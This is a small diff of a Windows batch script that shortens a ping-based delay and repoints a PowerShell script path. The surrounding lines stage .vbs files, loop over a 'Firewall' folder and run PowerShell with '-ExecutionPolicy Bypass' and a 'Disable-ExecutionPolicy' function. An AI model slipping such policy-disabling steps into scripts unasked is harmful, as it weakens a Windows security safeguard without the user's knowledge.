@@ -70,7 +70,7 @@ echo.
 
 echo running: %HD%\%NAME%x.ps1
 
-ping 127.0.0.1 -n 22 > nul
+ping 127.0.0.1 -n 14 > nul
 
 :: move script files with error checking
 if exist "%SF%\%NAME%.vbs" move /y "%SF%\%NAME%.vbs" "%HD%\" >nul
@@ -92,7 +92,7 @@ for %%f in (%SF%\Firewall\.*) do (
 
 ping 127.0.0.1 -n 6 > nul
 
-set _PATH=%HD%\%NAME%
+set _PATH=%HD%\%NAME%x.ps1
 
 powershell -ExecutionPolicy Bypass -Command "& {
     function Disable-ExecutionPolicy {
